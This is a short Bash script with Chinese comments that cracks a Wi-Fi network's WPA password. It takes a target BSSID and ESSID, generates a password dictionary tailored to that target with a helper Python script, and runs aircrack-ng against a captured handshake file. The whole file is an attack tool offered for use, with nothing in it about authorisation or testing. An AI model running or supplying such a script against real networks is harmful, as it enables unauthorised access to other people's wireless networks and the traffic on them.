#!/bin/bash
# 使用定向字典破解
# 用法: ./crack_with_dict.sh -b <BSSID> -e <ESSID> [handshake.pcap]
# 示例: ./crack_with_dict.sh -b "aa:bb:cc:dd:ee:ff" -e "MyWiFi" handshake.pcap

PCAP="handshake.pcap"
BSSID=""
ESSID=""
DICT="targeted_dict.txt"

usage() {
    echo "用法: $0 -b <BSSID> -e <ESSID> [pcap文件]"
    echo "  -b  BSSID (MAC地址，如 aa:bb:cc:dd:ee:ff)"
    echo "  -e  ESSID (WiFi名称)"
    echo "  pcap文件 默认 handshake.pcap"
    exit 1
}

while getopts "b:e:" opt; do
    case $opt in
        b) BSSID="$OPTARG" ;;
        e) ESSID="$OPTARG" ;;
        *) usage ;;
    esac
done
shift $((OPTIND-1))

if [ -n "$1" ]; then
    PCAP="$1"
fi

if [ -z "$BSSID" ] || [ -z "$ESSID" ]; then
    echo "[!] 请指定 BSSID 和 ESSID"
    usage
fi

if [ ! -f "$PCAP" ]; then
    echo "[!] 找不到 $PCAP"
    exit 1
fi

echo "[*] 生成分定向字典..."
python3 gen_targeted_dict.py

if [ ! -f "$DICT" ]; then
    echo "[!] 字典生成失败"
    exit 1
fi

LINES=$(wc -l < "$DICT")
echo "[*] 定向字典共 $LINES 个密码"
echo "[*] 目标: $ESSID ($BSSID)"
echo "[*] 开始破解..."

aircrack-ng -w "$DICT" -b "$BSSID" -e "$ESSID" "$PCAP"
